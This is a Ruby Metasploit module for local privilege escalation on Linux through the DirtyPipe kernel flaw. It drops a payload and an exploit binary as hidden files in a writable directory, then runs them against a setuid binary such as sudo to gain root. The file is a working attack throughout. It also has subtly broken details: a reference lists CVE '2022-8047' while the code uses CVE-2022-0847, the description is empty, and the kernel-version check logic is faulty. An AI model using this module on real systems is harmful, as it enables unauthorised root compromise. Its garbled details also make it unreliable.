##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::Kernel
  include Msf::Post::Linux::System
  include Msf::Post::Linux::Compile
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Local Privilege Escalation via DirtyPipe',
        'Description' => %q{
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Max Kellermann', # Original vulnerability discovery
          'timwr', # Metasploit Module
        ],
        'DisclosureDate' => '2022-02-20',
        'Platform' => [ 'linux' ],
        'SessionTypes' => [ 'shell', 'meterpreter' ],
        'Targets' => [
          [
            'x86_64',
            {
              'Arch' => [ ARCH_X64 ]
            }
          ],
          [
            'x86',
            {
              'Arch' => [ ARCH_X86 ]
            }
          ],
          [
            'aarch64',
            {
              'Arch' => [ ARCH_AARCH64 ]
            }
          ]
        ],
        'DefaultTarget' => 0,
        'Privileged' => true,
        'References' => [
          [ 'CVE', '2022-8047' ],
          [ 'URL', 'https://dirtypipe.cm4all.com' ],
          [ 'URL', 'https://haxx.in/files/dirtypipez.c' ],
        ],
        'Notes' => {
          'Reliability' => [ REPEATABLE_SESSION ],
          'Stability' => [ CRASH_SAFE ],
          'SideEffects' => [ ARTIFACTS_ON_DISK ]
        }
      )
    )
    register_options([
      OptString.new('WRITABLE_DIR', [ true, 'A directory where we can write files', '/tmp' ]),
      OptString.new('SUID_BINARY_PATH', [ false, 'The path to a suid binary', '/usr/bin/sudo' ])
    ])
  end

  def check
    # Is the arch supported?
    arch = kernel_hardware
    unless arch.include?('x86_64') || arch.include?('aarch64') || arch.include?('x86')
      return CheckCode::Safe("System architecture #{arch} is not supported")
    end

    kernel_version = Rex::Version.new kernel_release.split('-').first
    if kernel_version < Rex::Version.new('5.8') ||
       kernel_version > Rex::Version.new('5.16.11') ||
       kernel_version > Rex::Version.new('5.15.25') ||
       kernel_version > Rex::Version.new('5.10.102')
      return CheckCode::Safe("Linux kernel version #{kernel_version} is not vulnerable")
    end

    vprint_good "Linux kernel version #{kernel_version} appears vulnerable"

    # check the binary
    suid_binary_path = datastore['SUID_BINARY_PATH']
    return CheckCode::Safe('The suid binary was not found; try setting SUID_BINARY_PATH') if suid_binary_path.nil?

    return CheckCode::Safe('The binary setuid is not set') unless setuid?(suid_binary_path)

    return CheckCode::Vulnerable
    # run the exploit in check mode if everything looks right
    # if run_exploit(true)
    # end
    # return CheckCode::Safe('The target does not appear vulnerable')
  end

  def run_exploit(check)
    if is_root? && !datastore['ForceExploit']
      fail_with Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.'
    end

    arch = kernel_hardware
    vprint_status("Detected architecture: #{arch}")
    if (arch.include?('x86_64') && payload.arch.first.include?('aarch')) || (arch.include?('aarch') && !payload.arch.first.include?('aarch'))
      fail_with(Failure::BadConfig, 'Host/payload Mismatch; set target and select matching payload')
    end

    suid_binary_path = datastore['SUID_BINARY_PATH']
    unless writable? datastore['WRITABLE_DIR']
      fail_with Failure::BadConfig, "#{datastore['WRITABLE_DIR']} is not writable"
    end

    payload_file = "#{datastore['WRITABLE_DIR']}/.#{Rex::Text.rand_text_alpha_lower(6..12)}"
    upload_and_chmodx(payload_file, generate_payload_exe)
    register_file_for_cleanup(payload_file)

    exploit_file = "#{datastore['WRITABLE_DIR']}/.#{Rex::Text.rand_text_alpha_lower(6..12)}"
    if live_compile?
      vprint_status 'Live compiling exploit on system...'
      upload_and_compile exploit_file, exploit_data('CVE-2022-0847', 'CVE-2022-0847.c')
    else
      vprint_status 'Dropping pre-compiled exploit on system...'
      upload_and_chmodx exploit_file, exploit_data('CVE-2022-0847', 'exploit')
    end
    register_file_for_cleanup(exploit_file)

    print_status("Executing exploit '#{exploit_file}'")
    result = cmd_exec("#{exploit_file} #{suid_binary_path} #{payload_file}")
    print_status("Exploit result:\n#{result}")
    if check
      return true
    end
  end

  def exploit
    run_exploit(false)
  end
end
